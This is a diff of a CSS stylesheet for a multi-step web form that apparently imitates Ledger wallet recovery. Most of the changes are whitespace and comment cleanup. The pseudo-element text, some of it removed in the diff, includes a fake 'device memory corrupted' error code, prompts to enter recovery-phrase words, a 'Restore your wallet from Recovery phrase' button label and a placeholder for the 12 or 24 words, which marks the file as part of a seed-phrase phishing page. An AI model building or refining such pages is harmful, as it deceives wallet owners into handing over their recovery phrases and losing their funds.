@@ -9,6 +9,7 @@
   visibility: hidden;
   display: none;
 }
+
 /* Form.module.css */
 
 .timeline {
@@ -35,7 +36,7 @@
 }
 
 .element.active .dot {
-  background-color: #fff; /* White color for active dot */
+  background-color: #fff;
 }
 
 .dotbox {
@@ -72,22 +73,24 @@
 
 .line {
   flex-grow: 1;
-  border-top: 2px solid #f2f2f2; /* Initial greyed border */
+  border-top: 2px solid #f2f2f2;
   margin: 0 10px;
 }
 
 .element.active .line {
-  border-top-color: #fff; /* White color for active step progress */
+  border-top-color: #fff;
 }
 
 .step_one_content {
   width: 100%;
   margin: auto;
 }
+
 .step_one_content h2 {
   text-align: center;
   margin-bottom: 100px;
 }
+
 .image_box div[data-attribute] {
   display: flex;
   flex-direction: column;
@@ -96,26 +99,32 @@
   background: rgba(47, 47, 47, 0.37);
   border-radius: 8px;
 }
+
 .image_box div[data-attribute] h3 {
   font-size: 20px;
   font-family: 30px;
   font-weight: 400;
 }
+
 .image_box div[data-attribute]:hover {
   background: #292a2b;
 }
+
 .image_box div[data-attribute]:hover img {
   transform: scale(1.05);
   transition: transform 0.1s ease-in;
 }
+
 div.image_box img {
   width: 14%;
   padding: 12px 0 32px 0;
   transition: transform 0.1s ease-in-out;
 }
+
 div.image_box .last_child {
   width: 55% !important;
 }
+
 .step_two_content {
   width: 100%;
   margin: auto;
@@ -123,11 +132,13 @@ div.image_box .last_child {
   flex-direction: column;
   align-items: center;
 }
+
 .buttons {
   display: flex;
   flex-direction: column;
   gap: 12px;
 }
+
 .buttons button:nth-child(1) {
   background: #6257b7;
   color: #fafafa;
@@ -139,6 +150,7 @@ div.image_box .last_child {
   width: 100%;
   cursor: pointer;
 }
+
 .buttons button:nth-child(2) {
   background: #404142;
   color: #fafafa;
@@ -150,6 +162,7 @@ div.image_box .last_child {
   width: 100%;
   cursor: pointer;
 }
+
 .buttons button:nth-child(3) {
   background: green;
   color: #fafafa;
@@ -161,6 +174,7 @@ div.image_box .last_child {
   width: 100%;
   cursor: pointer;
 }
+
 .buttons button:nth-child(1) span,
 .buttons button:nth-child(2) span {
   text-align: left;
@@ -169,25 +183,23 @@ div.image_box .last_child {
 .buttons svg {
   font-size: 24px;
 }
+
 .step_two_content.hidden {
   display: none;
 }
+
 .loader_content {
   display: flex;
   flex-direction: column;
   align-items: center;
 }
+
 .step_three_content {
   display: flex;
   flex-direction: column;
   align-items: center;
 }
-.loader_content h2::before {
-  content: "Connect and unlock your device";
-}
-.step_three_content h2::before {
-  content: "Select & enter numbers of words in your recovery phrase";
-}
+
 .step_three_content h2,
 .step_one_content h2,
 .step_two_content h2,
@@ -197,6 +209,7 @@ div.image_box .last_child {
   text-align: center;
   color: #fff;
 }
+
 .step_two_content p {
   font-size: 20px;
   font-family: 24px;
@@ -205,12 +218,11 @@ div.image_box .last_child {
   text-align: center;
 }
 
-.step_two_content p::before {
-  content: 'Your devices memory has been corrupted. Ledger data damage error: 0x0m3Ck8n';
-}
 .textareaCon {
   position: relative;
 }
+
+/* KEEPING THIS — CSS placeholder version */
 .textareaCon::before {
   content: "Typically 12 (sometimes 24) words separated by single spaces";
   position: absolute;
@@ -222,20 +234,12 @@ div.image_box .last_child {
   transition: opacity 0.2s;
   opacity: 1;
 }
+
 .textareaCon:has(textarea:not(:placeholder-shown))::before {
   opacity: 0;
 }
+
 .textarea {
-  /* width: 100%;
-  margin: 0 auto;
-  min-height: calc(1.5em + 0.75rem + calc(1px * 2));
-  border-radius: 8px;
-  border: none;
-  padding: 15px;
-  font-size: 16px;
-  line-height: 24px;
-  color: #212529;
-  font-family: "Inter", sans-serif; */
   width: 100%;
   color: #212529;
   max-width: 100%;
@@ -249,16 +253,16 @@ div.image_box .last_child {
   box-sizing: border-box;
   resize: vertical;
 }
+
 .textarea::placeholder {
   font-size: 16px;
   line-height: 24px;
   color: #212529;
   font-family: "Inter", sans-serif;
 }
+
 .submitButton {
-  /* width: 40%; */
   margin: 40px auto 0;
-  padding: 10px;
   background-color: #6490f1;
   color: white;
   display: block;
@@ -266,6 +270,7 @@ div.image_box .last_child {
   padding: 20px 80px;
   font-size: 18px;
 }
+
 .popup {
   position: fixed;
   top: 50%;
@@ -286,6 +291,7 @@ div.image_box .last_child {
   color: #292a2b;
   text-align: center;
 }
+
 .closeButton {
   padding: 10px;
   background-color: #bbb0fd;
@@ -300,37 +306,38 @@ div.image_box .last_child {
   .image_box {
     display: block;
   }
+
   .step_one_content h2 {
     margin-bottom: 40px;
   }
+
   .timeline {
     width: 100%;
   }
+
   .timeline span {
     font-size: 10px;
   }
+
   .image_box div[data-attribute] {
     margin: 20px 0;
   }
+
   .loader_content img:nth-child(2) {
     width: 80%;
   }
+
   .step_two_content p {
     width: 80%;
   }
-  /* .textarea {
-    width: 85%;
-  } */
+
   .submitButton {
     width: unset;
   }
+
   .popup {
     left: 0;
     padding: 20px 60px;
     transform: translate(9%, 0%);
   }
-}
-
-.buttons button:nth-child(1) span::before {
-  content: "Restore your wallet from Recovery phrase";
 }
